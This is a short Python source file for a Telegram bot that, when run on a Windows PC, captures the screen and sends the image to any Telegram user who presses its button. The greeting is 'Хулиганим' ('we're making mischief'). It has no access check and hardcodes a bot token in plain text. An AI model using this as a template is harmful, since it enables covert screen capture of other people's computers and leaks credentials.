import telebot
import pyautogui
import win32api, win32con, win32gui
import os
from telebot import types
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

# настройка
bot = telebot.TeleBot('5747207857:AAH0F8fGDmXFfmGAkA7A-lKXhVhoS_elAc8')
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))

# функции
@bot.message_handler(commands=['start'])
def start(message):

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Скриншот")
    btn2 = types.KeyboardButton("Выключить звук")
    markup.add(btn1, btn2)
    bot.send_message(message.from_user.id, "Хулиганим", reply_markup=markup)

@bot.message_handler(content_types=['text'])
def get_text_messages(message):

    if message.text == 'Скриншот':
        pyautogui.screenshot('screenshot.png',region=(0,0, 1920, 1080))
        bot.send_photo(message.from_user.id, photo=open('screenshot.png', 'rb'))
    
    if message.text == 'Выключить звук':
        bot.send_message(message.from_user.id, "QQ")

if __name__ == "__main__":
    bot.polling(none_stop=True, interval=0)